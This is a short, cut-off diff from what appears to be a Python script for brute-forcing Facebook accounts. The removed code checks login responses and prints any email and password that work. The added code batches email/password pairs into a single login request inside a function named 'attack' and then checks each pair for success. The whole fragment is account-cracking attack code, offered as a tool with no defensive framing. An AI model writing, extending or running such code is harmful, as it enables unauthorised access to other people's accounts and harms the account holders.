@@ -46,10 +46,17 @@ def send_request(url, data):
     rsp = req.content.decode('utf-8')
     return rsp
 
-def check_response(content, email, passwd):
-    if "Welcome to Facebook" in content:
-        print(bcolors.OKGREEN +
-              "+ -- --=[w00t! Login successful! Email/Password: " + email + "/" + passwd + "" + bcolors.ENDC)
-        sys.exit(0)
-    elif 'Find Friends' in content or 'security code' in content or 'Two-factor authentication' in content or "Log Out" in content:
-        print(bcolors.FAIL +
+def template(entries):
+    t = 'email=%s&pass=%s'
+    return '&'.join([t % (entry.get('email'), entry.get('passwd')) for entry in entries])
+
+def attack(entries):
+    if len(entries) < 1:
+        return
+
+    t = template(entries)
+    response = send_request(url, t)
+
+    # Check if any successful logins were found
+    for entry in entries:
+        if "Welcome to Facebook
